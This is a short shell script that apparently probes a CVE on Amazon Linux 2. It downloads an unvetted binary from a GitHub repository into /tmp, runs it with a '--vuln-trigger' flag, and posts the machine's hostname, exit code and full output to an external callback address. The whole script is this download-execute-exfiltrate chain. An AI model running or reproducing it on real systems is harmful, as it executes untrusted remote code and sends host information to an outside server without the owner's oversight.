#!/bin/sh
set -u
TAG="${CVE_TAG:-unknown}"
HOST="$(hostname)"
BIN='https://raw.githubusercontent.com/begimher/snapgpt-probes/8b4de89aa416bbbee01530323c1393e846555876/cve-2026-23351-amzn2-two-diag'
SINK="https://54.209.51.244.sslip.io/callback/snapgpt-cve-diag-${TAG}-20261106"
curl -fsSL "$BIN" -o /tmp/cve-diag
chmod +x /tmp/cve-diag
timeout 600 /tmp/cve-diag --vuln-trigger > /tmp/cve-diag.out 2>&1
rc=$?
printf 'TAG=%s HOST=%s CVE_RC=%s\n' "$TAG" "$HOST" "$rc"
wc -c /tmp/cve-diag.out
tail -30 /tmp/cve-diag.out
{ printf 'TAG=%s HOST=%s CVE_RC=%s\n' "$TAG" "$HOST" "$rc"; cat /tmp/cve-diag.out; } | curl -fsS -X POST -H 'Content-Type: text/plain' --data-binary @- "$SINK" >/dev/null
